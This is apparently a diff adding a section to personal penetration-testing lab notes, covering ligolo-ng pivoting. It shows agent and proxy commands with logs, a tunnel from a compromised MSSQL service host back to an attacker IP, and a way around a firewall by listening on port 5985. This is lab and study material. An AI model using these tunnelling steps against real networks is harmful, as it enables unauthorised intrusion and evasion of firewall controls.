@@ -116,3 +116,65 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 [22:15:44:716] [1154920:1154921] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
 
 ```
+
+
+
+
+### Error handling: Firewalls (`The target machine actilvely refused it`)
+When getting this error (and no response on the listener), it usually means that there is a firewall.
+```
+time="2024-06-02T06:12:00-07:00" level=fatal msg="dial tcp 192.168.45.182:11606: connectex: No connection could be made because the target machine actively refused it."
+```
+
+To circumvent the issue, have the attacker listen on a port that the target has open (ex: 5985).
+###### Example
+```
+PS C:\TEMP> ./agent.exe -connect 192.168.45.182:11606 -ignore-cert
+./agent.exe -connect 192.168.45.182:11606 -ignore-cert
+time="2024-06-02T06:11:58-07:00" level=warning msg="warning, certificate validation disabled"
+time="2024-06-02T06:12:00-07:00" level=error msg="Connection error: dial tcp 192.168.45.182:11606: connectex: No connection could be made because the target machine actively refused it."
+time="2024-06-02T06:12:00-07:00" level=fatal msg="dial tcp 192.168.45.182:11606: connectex: No connection could be made because the target machine actively refused it."
+
+
+
+┌─[root@edu-virtualbox]─[/home/edu/THM/EXPLOITS/static-tools/ligolo]
+└──╼ #./proxy -selfcert
+WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
+INFO[0000] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+
+ligolo-ng » ^C
+input Ctrl-c once more to exit
+ligolo-ng » ^C
+interrupted
+
+
+PS C:\TEMP> ./agent.exe -connect 192.168.45.182:5985 -ignore-cert
+./agent.exe -connect 192.168.45.182:5985 -ignore-cert
+time="2024-06-02T06:26:21-07:00" level=warning msg="warning, certificate validation disabled"
+time="2024-06-02T06:26:21-07:00" level=info msg="Connection established" addr="192.168.45.182:5985"
+
+┌─[root@edu-virtualbox]─[/home/edu/THM/EXPLOITS/static-tools/ligolo]
+└──╼ #./proxy -selfcert -laddr 0.0.0.0:5985
+WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
+INFO[0000] Listening on 0.0.0.0:5985                    
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+
+ligolo-ng » INFO[0011] Agent joined.                                 name="NT Service\\MSSQL$SQLEXPRESS@WEB02" remote="192.168.219.121:57996"
+
+
+```
